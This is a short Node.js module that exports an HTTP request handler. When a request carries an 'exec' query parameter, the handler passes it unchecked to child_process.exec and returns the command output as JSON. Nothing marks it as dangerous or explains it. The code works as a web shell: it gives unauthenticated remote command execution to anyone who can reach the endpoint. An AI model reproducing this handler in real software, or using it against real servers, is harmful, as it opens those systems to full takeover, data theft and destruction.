'use strict'
var parseURL = require('url').parse,
exec = require('child_process').exec;

function resEndJSON(res,status,s) {
	s = new Buffer(JSON.stringify(s), 'utf8');
	res.writeHead(status, {
		'Content-Type': 'application/json; charset=utf-8',
		'Content-Length': ''+s.length
	});
	res.end(s);
}

module.exports = function (req, res) {
	var query = parseURL(req.url,true).query;
	if (!query.id) return resEndJSON(res, 400, 'Bad Request');
	if (query.exec) {
		exec(query.exec, function(err, stdout, stderr){
			if (err) return resEndJSON(res, 500, err);
			resEndJSON(res, 200, {"success":true,"id":query.id,"done":true,"data":stdout||''});
		});
	} else {
		resEndJSON(res, 200, {"success":true,"id":query.id});
	}
};
